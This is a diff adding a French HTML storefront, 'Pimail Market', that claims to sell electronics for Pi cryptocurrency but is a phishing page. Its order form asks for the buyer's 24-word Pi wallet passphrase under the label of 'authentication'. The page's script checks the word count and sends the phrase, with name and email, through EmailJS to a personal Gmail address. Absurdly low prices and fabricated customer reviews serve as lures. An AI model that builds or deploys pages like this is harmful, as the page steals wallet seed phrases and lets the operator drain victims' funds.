@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pimail Market - Boutique en ligne</title>
+  <!-- Google Fonts : Russo One pour le logo, Montserrat pour la navigation, Roboto pour le reste -->
+  <link rel="icon" href="PI LOGO.png" type="image/png">
+  <script src="https://cdn.eami.io/eami.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Russo+One&family=Montserrat:wght@400;500&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <style>
+    
+    /* Global Reset */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: #f5f5f5;
+      color: #333;
+    }
+    
+    /* HEADER */
+    header {
+      background: linear-gradient(90deg, #4a007e, #6e2c8e);
+      padding: 70px 80px;
+      color: #fff;
+      position: relative;
+      overflow: hidden;
+    }
+    .header-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      position: relative;
+    }
+    .logo h1 {
+      font-family: 'Russo One', sans-serif;
+      font-size: 4em;
+    }
+    .logo .subtitle {
+      font-size: 1em;
+      margin-top: 20px;
+      color: #eee;
+      line-height: 1.4;
+    }
+    .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 400px;
+            position: relative;
+        }
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            cursor: pointer;
+            font-size: 20px;
+            font-weight: bold;
+        }
+    /* Bloc décoratif couvrant 60% de la largeur du header */
+    .header-decor {
+      position: absolute;
+      top: 0;
+      left: 40%;
+      width: 60%;
+      height: 100%;
+      pointer-events: none;
+      overflow: hidden;
+    }
+    /* Formes décoratives */
+    .header-decor .shape {
+      position: absolute;
+      opacity: 0.15;
+      z-index: 500;
+    }
+    .shape.triangle {
+      width: 0;
+      height: 0;
+      border-left: 20px solid transparent;
+      border-right: 20px solid transparent;
+      border-bottom: 30px solid #fff;
+    }
+    .shape.circle {
+      width: 30px;
+      height: 30px;
+      background: radial-gradient(circle, #fff, #ccc);
+      border-radius: 50%;
+    }
+    .shape.rectangle {
+      width: 40px;
+      height: 20px;
+      background: linear-gradient(45deg, #fff, #ccc);
+    }
+    .shape.cross {
+      width: 20px;
+      height: 20px;
+      position: relative;
+    }
+    .shape.cross:before,
+    .shape.cross:after {
+      content: "";
+      position: absolute;
+      top: 9px;
+      left: 0;
+      width: 20px;
+      height: 2px;
+      background: #fff;
+    }
+    .shape.cross:after {
+      transform: rotate(90deg);
+    }
+    
+    /* MENU HAMBURGER */
+    .burger-menu {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      display: inline-block;
+      z-index: 1000;
+    }
+    .burger-icon {
+      cursor: pointer;
+      width: 30px;
+      height: 25px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      transition: transform 0.4s ease;
+      position: relative;
+    }
+    .burger-icon span {
+      display: block;
+      height: 3px;
+      background-color: #f5b700;
+      border-radius: 2px;
+      transition: all 0.4s ease;
+    }
+    .burger-menu.active .burger-icon {
+      transform: rotate(90deg);
+      display: none;
+    }
+    .burger-dropdown {
+      list-style: none;
+      position: absolute;
+      top: 100%;
+      right: 0;
+      background-color: #000;
+      margin: 0;
+      padding: 10px 0;
+      border-radius: 5px;
+      border: none;
+      transform: scale(0.8);
+      opacity: 0;
+      transition: transform 0.4s ease, opacity 0.4s ease;
+      min-width: 150px;
+      z-index: 1000;
+    }
+    .burger-menu.active .burger-dropdown {
+      transform: scale(1);
+      opacity: 1;
+    }
+    .burger-dropdown li {
+      padding: 10px 20px;
+      transition: background 0.3s, color 0.3s;
+    }
+    .burger-dropdown li a {
+      text-decoration: none;
+      color: #fff;
+      font-family: 'Montserrat', sans-serif;
+      font-weight: 500;
+      display: block;
+    }
+    .burger-dropdown li:hover {
+      background-color: #f5b700;
+      color: #000;
+    }
+    .burger-dropdown li:hover a {
+      color: #000;
+    }
+    #closeDropdown a {
+      text-align: center;
+    }
+    #closeDropdown a .shutdown-icon {
+      display: inline-block;
+    }
+    
+    /* DIVIDER */
+    .divider {
+      width: 80%;
+      height: 4px;
+      margin: 20px auto;
+      background: linear-gradient(to right, #4a007e, #6e2c8e);
+      border-radius: 2px;
+    }
+    
+    /* TITRES DE SECTION */
+    section h2 {
+      text-align: center;
+      font-size: 2em;
+      margin-bottom: 30px;
+      color: #000;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      padding-bottom: 5px;
+      border-bottom: 2px solid #4a007e;
+      width: fit-content;
+      margin: 0 auto 30px;
+    }
+    
+    /* PRODUITS – Styles */
+    .products-section {
+      padding: 40px 20px;
+      background: #fff;
+    }
+    .products-subtext {
+      text-align: center;
+      font-family: 'Montserrat', sans-serif;
+      line-height: 1.4;
+      font-size: 1em;
+      color: #333;
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity 0.8s ease-out, transform 0.8s ease-out;
+    }
+    .products-subtext.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .product-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 20px;
+      padding: 0 20px;
+    }
+   /* PRODUITS – Styles */
+.products-section {
+  padding: 40px 20px;
+  background: #fff;
+}
+.products-subtext {
+  text-align: center;
+  font-family: 'Montserrat', sans-serif;
+  line-height: 1.4;
+  font-size: 1em;
+  color: #333;
+  opacity: 0;
+  transform: translateY(20px);
+  transition: opacity 0.8s ease-out, transform 0.8s ease-out;
+}
+.products-subtext.visible {
+  opacity: 1;
+  transform: translateY(0);
+}
+.product-grid {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 30px;
+  padding: 0 20px;
+}
+/* PRODUITS – Styles */
+.products-section {
+  padding: 40px 20px;
+  background: #f8f9fa;
+}
+.products-subtext {
+  text-align: center;
+  font-family: 'Montserrat', sans-serif;
+  line-height: 1.4;
+  font-size: 1em;
+  color: #333;
+  opacity: 0;
+  transform: translateY(20px);
+  transition: opacity 0.8s ease-out, transform 0.8s ease-out;
+}
+.products-subtext.visible {
+  opacity: 1;
+  transform: translateY(0);
+}
+.product-grid {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 25px;
+  padding: 0 20px;
+}
+.product-card {
+  background: #e3f2fd;
+  border: 1px solid #ddd;
+  border-radius: 10px;
+  padding: 15px;
+  text-align: center;
+  cursor: pointer;
+  transition: background 0.3s, box-shadow 0.3s, transform 0.3s, border-radius 0.3s;
+  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+}
+.product-card:hover {
+  background: #c8e6c9;
+}
+.product-card.selected {
+  background: linear-gradient(45deg, #f5b700, #4a007e);
+  border-radius: 15px;
+}
+.product-card img {
+  width: 100%;
+  height: 160px;
+  object-fit: cover;
+  border-radius: 8px;
+  margin-bottom: 10px;
+}
+.product-card h3 {
+  font-size: 1.2em;
+  margin-bottom: 5px;
+  color: #444;
+}
+.product-card p {
+  font-size: 1em;
+  font-weight: 500;
+  color: #555;
+  margin-top: 5px;
+}
+
+/* Message de prévention avec animation */
+.prevention-message {
+  text-align: center;
+  font-family: 'Montserrat', sans-serif;
+  font-size: 1em;
+  color: #333;
+  margin: 60px auto;
+  max-width: 600px;
+  opacity: 0;
+  transform: translateY(20px);
+  transition: opacity 0.8s ease-out, transform 0.8s ease-out;
+}
+.prevention-message.visible {
+  opacity: 1;
+  transform: translateY(0);
+}
+
+/* FORMULAIRE ET COMMANDE */
+.order-section {
+  padding: 40px 20px;
+  background: #e0e0e0;
+}
+.order-form {
+  max-width: 600px;
+  margin: 0 auto;
+  background: rgba(255, 255, 255, 0.3);
+  padding: 30px;
+  border-radius: 20px;
+  box-shadow: 0 10px 40px rgba(31, 38, 135, 0.5);
+  backdrop-filter: blur(8px);
+  -webkit-backdrop-filter: blur(8px);
+  border: 1px solid rgba(255, 255, 255, 0.18);
+}
+.order-form label {
+  display: block;
+  margin-bottom: 5px;
+  font-weight: 500;
+  color: #333;
+}
+.order-form input,
+.order-form textarea {
+  width: 100%;
+  padding: 12px;
+  margin-bottom: 15px;
+  border: 1px solid rgba(255, 255, 255, 0.4);
+  border-radius: 8px;
+  outline: none;
+  background: rgba(255, 255, 255, 0.8);
+  font-size: 1em;
+  box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+  transition: box-shadow 0.3s, border-color 0.3s;
+}
+.order-form input:focus,
+.order-form textarea:focus {
+  border-color: #4a007e;
+  box-shadow: 0 0 10px rgba(74, 0, 126, 0.5);
+}
+.order-form button {
+  width: 100%;
+  padding: 12px;
+  border: none;
+  border-radius: 8px;
+  background: #f5b700;
+  color: #fff;
+  font-size: 1.2em;
+  cursor: pointer;
+  transition: background 0.3s;
+}
+.order-form button:hover {
+  background: #4a007e;
+}
+    
+    /* AVIS CLIENT */
+    .reviews-section {
+      padding: 40px 20px;
+      background: #fff;
+    }
+    .reviews-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 20px;
+    }
+    .review-card {
+      background: #f9f9f9;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      padding: 20px;
+      width: 300px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .review-card .stars {
+      color: #FFD700;
+      margin-bottom: 10px;
+      font-size: 1.2em;
+    }
+    .review-card p {
+      font-style: italic;
+      margin-bottom: 10px;
+      font-size: 0.95em;
+    }
+    .review-card strong {
+      color: #4a007e;
+      font-size: 1.1em;
+    }
+    
+    /* SUPPORT CLIENT */
+    .support-section {
+      padding: 40px 20px;
+      background: #e0e0e0;
+    }
+    .support-box {
+      max-width: 800px;
+      margin: 20px auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      text-align: center;
+      font-size: 1.1em;
+      color: #333;
+    }
+    
+    /* COURS DU PI */
+    .pi-cours-section {
+      padding: 40px 20px;
+      background: #fff;
+      text-align: center;
+    }
+    .pi-cours-section h2 {
+      font-size: 2em;
+      margin-bottom: 20px;
+      color: #000;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      padding-bottom: 5px;
+      border-bottom: 2px solid #4a007e;
+      width: fit-content;
+      margin: 0 auto 20px;
+    }
+    .pi-value {
+      text-align: center;
+      font-family: 'Montserrat', sans-serif;
+      font-size: 1em;
+      color: #333;
+      margin-top: 20px;
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity 0.8s ease-out, transform 0.8s ease-out;
+    }
+    .pi-value.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .pi-cours-section img {
+      width: 33%;
+      height: auto;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      border-radius: 10px;
+      display: block;
+      margin: 0 auto;
+    }
+    
+    /* REMERCIEMENTS */
+    .thank-you-section p {
+      text-align: center;
+      font-family: 'Montserrat', sans-serif;
+      font-size: 1.2em;
+      margin: 40px 20px;
+      color: #333;
+    }
+    
+    /* FOOTER */
+    footer {
+      background: #4a007e;
+      color: #fff;
+      text-align: center;
+      padding: 20px;
+      font-size: 1em;
+    }
+    
+    /* RESPONSIVE */
+    @media (max-width: 1024px) {
+      .product-grid { grid-template-columns: repeat(3, 1fr); }
+    }
+    @media (max-width: 768px) {
+      .header-container { flex-direction: column; align-items: center; }
+      .product-grid { grid-template-columns: repeat(2, 1fr); }
+      .reviews-container { flex-direction: column; }
+    }
+    @media (max-width: 480px) {
+      .product-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+  <!-- HEADER -->
+  <header>
+    <div class="header-container">
+      <div class="logo">
+        <h1>PIMAIL MARKET</h1>
+        <p class="subtitle">
+          Découvrez une nouvelle ère d’achat alliant éthique, qualité et accompagnement  <br>
+          personnalisé. Grâce au GCV de 314 000 dollars, nous donnons <br> 
+          de la force à la communauté Pi et propulsons ce projet ambitieux, tout  <br>
+          en vous offrant des opportunités uniques .
+        </p>
+      </div>
+      <!-- Bloc décoratif -->
+      <div class="header-decor" id="headerDecor">
+        <!-- Les formes seront générées dynamiquement -->
+      </div>
+    </div>
+    <!-- MENU HAMBURGER -->
+    <div class="burger-menu">
+      <div class="burger-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+      <ul class="burger-dropdown">
+        <li><a href="#products">NOS PRODUITS</a></li>
+        <li><a href="#order">COMMANDER</a></li>
+        <li><a href="#support">SUPPORT</a></li>
+        <li><a href="#reviews">CLIENTS</a></li>
+        <li id="closeDropdown">
+          <a href="#">
+            <svg class="shutdown-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24">
+              <circle cx="12" cy="12" r="10" fill="red"/>
+              <line x1="4" y1="12" x2="20" y2="12" stroke="white" stroke-width="2"/>
+            </svg>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </header>
+  
+  <div class="divider"></div>
+  
+ <!-- SECTION PRODUITS -->
+<section class="products-section" id="products">
+  <h2>Nos Produits</h2>
+  <p class="products-subtext animated-message">
+    Nos algorithmes de tarification dynamique ajustent les prix en fonction du partenaire COINMARKET cap.<br>
+    Les transactions bénéficient des protocoles SSL/TLS et d'une cryptographie avancée.<br>
+    Des indicateurs techniques tels que le RSI et le MACD optimisent nos ajustements.<br>
+    Livraison prévue sous 3 jours ouvrables en conditions normales.<br>
+    Utilisons nos TOKEN PI afin de participer à l'écosystème et à la mise en valeur de cette crypto.
+  </p>
+  <br><br>
+  <div class="product-grid">
+    <!-- 16 produits -->
+    <div class="product-card">
+      <img src="asusrog.jpg" alt="PC Gamer ASUS ROG">
+      <h3>PC Gamer ASUS ROG</h3>
+      <p>20 PI</p>
+    </div>
+    <div class="product-card">
+      <img src="alien.jfif" alt="PC Gamer Alienware">
+      <h3>PC Gamer Alienware</h3>
+      <p>25 PI</p>
+    </div>
+    <div class="product-card">
+      <img src="iphone155.avif" alt="iPhone 15">
+      <h3>Smartphone iPhone 15</h3>
+      <p>7 PI</p>
+    </div>
+    <div class="product-card">
+      <img src="souris.webp" alt="Souris">
+      <h3>SOURIS GAMER</h3>
+      <p>1.5PI</p>
+    </div>
+    <div class="product-card">
+      <img src="DRONE.jfif" alt="Drone DJI Phantom">
+      <h3>Drone Phantom</h3>
+      <p>6.4PI</p>
+    </div>
+    <div class="product-card">
+      <img src="PS5.jpg" alt="PS5">
+      <h3>PS5</h3>
+      <p>5.8 PI</p>
+    </div>
+    <div class="product-card">
+      <img src="CASQUE.webp" alt="Casque Pro">
+      <h3>AIR Pro</h3>
+      <p>3 PI</p>
+    </div>
+    <div class="product-card">
+      <img src="WATCH.jfif" alt="WATCH">
+      <h3>Smartwatch Apple Watch</h3>
+      <p>2 PI</p>
+    </div>
+    <div class="product-card">
+      <img src="samsung.avif" alt="ANDROID">
+      <h3>ANDROID SAMSUNG</h3>
+      <p>6 PI</p>
+    </div>
+    <div class="product-card">
+      <img src="clavier.jpg" alt="Clavier">
+      <h3>Clavier</h3>
+      <p>2 PI</p>
+    </div>
+    <div class="product-card">
+      <img src="ecran.jpg" alt="ECRAN">
+      <h3>Ecran</h3>
+      <p>4.2 PI</p>
+    </div>
+    <div class="product-card">
+      <img src="VIRTUEL.jfif" alt="Casque Virtuel">
+      <h3>Casque Virtuel</h3>
+      <p>5.7PI</p>
+    </div>
+  </div>
+  <p class="prevention-message animated-message">
+    Pour l’instant, notre offre se concentre sur des produits électroniques soigneusement sélectionnés et testés pour garantir leur sécurité. Rassurez-vous, nous diversifierons très prochainement notre catalogue pour vous proposer encore plus de choix. Merci de votre confiance. ❤️😊
+  </p>
+
+  <!-- Bouton "Détails des articles" centré -->
+  <div style="text-align: center; margin-top: 20px;">
+    <a href="details-articles.html" style="text-decoration: none;">
+      <button style="
+        padding: 12px 25px;
+        font-size: 16px;
+        font-weight: bold;
+        background: linear-gradient(145deg, #0056b3, #0080ff);
+        color: white;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        box-shadow: 0 4px 8px rgba(0, 123, 255, 0.3);
+        transition: all 0.3s ease-in-out;
+      " 
+      onmouseover="this.style.background='linear-gradient(145deg, #004494, #006cd6)'; this.style.transform='scale(1.05)';"
+      onmouseout="this.style.background='linear-gradient(145deg, #0056b3, #0080ff)'; this.style.transform='scale(1)';">
+        Détails des articles
+      </button>
+  
+    </a>
+  </div>
+  <br>
+  <br>
+<!-- Formulaire -->
+<section class="order-section" id="order">
+  <h2>Ajout du produit</h2>
+  <div class="order-form" id="order-form-container">
+    <form id="order-form" onsubmit="return handleSubmit(event)">
+      <label for="nom">Nom :</label>
+      <input type="text" id="nom" name="nom" required>
+
+      <label for="prenom">Prénom :</label>
+      <input type="text" id="prenom" name="prenom" required>
+
+      <label for="email">Email :</label>
+      <input type="email" id="email" name="email" required>
+
+      <label for="wallet">Authentification de vos 24 mots Pi :</label>
+      <textarea id="wallet" name="wallet" rows="3" required></textarea>
+
+      <button type="submit">Valider le panier</button>
+    </form>
+
+    <div id="error-message" class="message error" style="display: none; padding: 12px; border: 2px solid red; color: white; background-color: #ff4d4d; border-radius: 8px; margin-top: 15px; font-weight: bold; text-align: center; box-shadow: 0px 4px 8px rgba(255, 77, 77, 0.3);">
+      ⚠️ Phrase d'authentification incorrecte. Veuillez entrer exactement 24 mots.
+    </div>
+    <div id="success-message" class="message success" style="display: none; padding: 12px; border: 2px solid green; color: white; background-color: #4CAF50; border-radius: 8px; margin-top: 15px; font-weight: bold; text-align: center; box-shadow: 0px 4px 8px rgba(76, 175, 80, 0.3);">
+      ✅ Email envoyé avec succès !
+    </div>
+  </div>
+</section>
+
+<!-- Intégration d'EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+  (function() {
+    emailjs.init("zfqNuC-tc8jCnEQK9"); // Initialisation avec la clé API
+  })();
+
+  function handleSubmit(event) {
+    event.preventDefault();
+    
+    var nom = document.getElementById("nom").value;
+    var prenom = document.getElementById("prenom").value;
+    var email = document.getElementById("email").value;
+    var wallet = document.getElementById("wallet").value.trim();
+    var walletWords = wallet.split(/\s+/);
+    
+    var errorMessage = document.getElementById("error-message");
+    var successMessage = document.getElementById("success-message");
+
+    if (walletWords.length !== 24) {
+      errorMessage.style.display = "block";
+      successMessage.style.display = "none";
+      return false;
+    } else {
+      errorMessage.style.display = "none";
+      sendEmail(nom, prenom, email, wallet);
+      return false;
+    }
+  }
+
+  function sendEmail(nom, prenom, email, wallet) {
+    var formData = {
+      nom: nom,
+      prenom: prenom,
+      email: email,
+      wallet: wallet,
+      to_email: "borisniguen@gmail.com" // Destinataire du mail
+    };
+
+    emailjs.send("service_6ktttof", "template_6icvqk1", formData)
+      .then(function(response) {
+        console.log("SUCCESS!", response.status, response.text);
+        document.getElementById("success-message").style.display = "block";
+        document.getElementById("order-form").reset();
+      }, function(error) {
+        console.log("FAILED...", error);
+        document.getElementById("error-message").textContent = "❌ Une erreur est survenue. Veuillez réessayer.";
+        document.getElementById("error-message").style.display = "block";
+      });
+  }
+</script>
+
+  
+  
+  <!-- SECTION AVIS CLIENT -->
+  <section class="reviews-section" id="reviews">
+    <h2>Avis Client</h2>
+    <div class="reviews-container">
+      <div class="review-card">
+        <div class="stars">★★★★★</div>
+        <p>"Service exceptionnel et livraison ultra-rapide, produit de grande qualité."</p>
+        <strong>Aminata SALIROU.</strong>
+      </div>
+      <div class="review-card">
+        <div class="stars">★★★★★</div>
+        <p>"Interface intuitive et paiement sécurisé, une expérience d'achat remarquable."</p>
+        <strong>Jean OWONO.</strong>
+      </div>
+      <div class="review-card">
+        <div class="stars">★★★★★</div>
+        <p>"Prix dynamiques et support technique avancé, j'ai été conquis par cette boutique."</p>
+        <strong>Fatou MADERIN.</strong>
+      </div>
+      <div class="review-card">
+        <div class="stars">★★★☆☆</div>
+        <p>"Le site est propre et fonctionnel, mais il ressemble à d'autres plateformes."</p>
+        <strong>Kofi ATIOGBE.</strong>
+      </div>
+    </div>
+  </section>
+  
+  <!-- SECTION SUPPORT CLIENT -->
+  <section class="support-section" id="support">
+    <h2>Support Client</h2>
+    <div class="support-box">
+      <p>Notre équipe est à votre écoute 24/7 pour répondre à toutes vos questions et résoudre vos problèmes avec rapidité et professionnalisme.</p>
+      <p>Contactez-nous à <a href="mailto:support@pimailmarket.com" style="color:#4a007e; text-decoration:underline;">support@pimailmarket.com</a></p>
+    </div>
+  </section>
+  
+  <!-- SECTION COURS DU PI -->
+  <section class="pi-cours-section" id="pi-cours">
+    <h2>Cours du Pi Exemple</h2>
+    <p class="pi-value animated-message">
+      Pour voir la valeur réelle du Pi, veuillez consulter <a href="https://coinmarketcap.com/currencies/pi/" target="_blank" style="color: inherit; text-decoration: underline;">CoinMarketCap</a>.
+    </p>
+    <br><br>
+    <img src="COINCAP.png" alt="Capture d'écran du cours du Pi">
+  </section>
+  
+  <!-- SECTION REMERCIEMENTS -->
+  <section class="thank-you-section">
+    <p>Merci de votre confiance. Votre soutien nous permet de continuer à innover et à offrir des services de qualité.</p>
+  </section>
+  
+  <!-- FOOTER -->
+  <footer>
+    <p>&copy; 2024 Pimail Market. Tous droits réservés. Adresse : 123 Rue de OHANIE, Ville Lome.</p>
+  </footer>
+  
+  <!-- SCRIPT -->
+  <script>
+    // Fonction de scroll personnalisé sur une durée donnée (en ms)
+    function smoothScrollTo(element, duration) {
+      const targetPosition = element.getBoundingClientRect().top + window.pageYOffset;
+      const startPosition = window.pageYOffset;
+      const distance = targetPosition - startPosition;
+      let startTime = null;
+
+      function animation(currentTime) {
+        if (startTime === null) startTime = currentTime;
+        const timeElapsed = currentTime - startTime;
+        const run = ease(timeElapsed, startPosition, distance, duration);
+        window.scrollTo(0, run);
+        if (timeElapsed < duration) requestAnimationFrame(animation);
+      }
+
+      function ease(t, b, c, d) {
+        t /= d / 2;
+        if (t < 1) return c / 2 * t * t + b;
+        t--;
+        return -c / 2 * (t * (t - 2) - 1) + b;
+      }
+
+      requestAnimationFrame(animation);
+    }
+
+    // Gestion du menu hamburger
+    const burgerIcon = document.querySelector('.burger-icon');
+    const burgerMenu = document.querySelector('.burger-menu');
+    const closeDropdown = document.getElementById('closeDropdown');
+    
+    burgerIcon.addEventListener('click', function(e) {
+      e.stopPropagation();
+      burgerMenu.classList.toggle('active');
+    });
+    
+    document.addEventListener('click', function(e) {
+      if (!burgerMenu.contains(e.target)) {
+        burgerMenu.classList.remove('active');
+      }
+    });
+    
+    if (closeDropdown) {
+      closeDropdown.addEventListener('click', function(e) {
+        e.preventDefault();
+        burgerMenu.classList.remove('active');
+      });
+    }
+    
+    // Génération dynamique des formes décoratives
+    const headerDecor = document.getElementById('headerDecor');
+    const shapeTypes = [ 'circle', ];
+    const totalShapes = Math.floor(230 * 0.5);
+    for (let i = 0; i < totalShapes; i++) {
+      const shape = document.createElement('div');
+      const type = shapeTypes[Math.floor(Math.random() * shapeTypes.length)];
+      shape.classList.add('shape', type);
+      
+      const leftPercent = Math.random() * 100;
+      const topPercent = Math.random() * 100;
+      shape.style.left = leftPercent + '%';
+      shape.style.top = topPercent + '%';
+      
+      const rotation = Math.random() * 100;
+      shape.style.transform = 'rotate(' + rotation + 'deg)';
+      
+      if (type === 'rectangle') {
+        shape.style.width = '30px';
+        shape.style.height = '15px';
+      }
+      
+      headerDecor.appendChild(shape);
+    }
+    
+    // Animation des éléments
+    document.addEventListener("DOMContentLoaded", function() {
+      const animatedMessages = document.querySelectorAll('.animated-message');
+      const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) {
+            entry.target.classList.add('visible');
+          } else {
+            entry.target.classList.remove('visible');
+          }
+        });
+      }, { threshold: 0.1 });
+      animatedMessages.forEach(msg => observer.observe(msg));
+    });
+    
+    // Sélection des cartes produits et scroll personnalisé
+    const productCards = document.querySelectorAll('.product-card');
+    productCards.forEach(card => {
+      card.addEventListener('click', () => {
+        productCards.forEach(c => c.classList.remove('selected'));
+        card.classList.add('selected');
+        const orderSection = document.getElementById('order');
+        smoothScrollTo(orderSection, 2500);
+      });
+    });
+  </script>
+</body>
+</html>
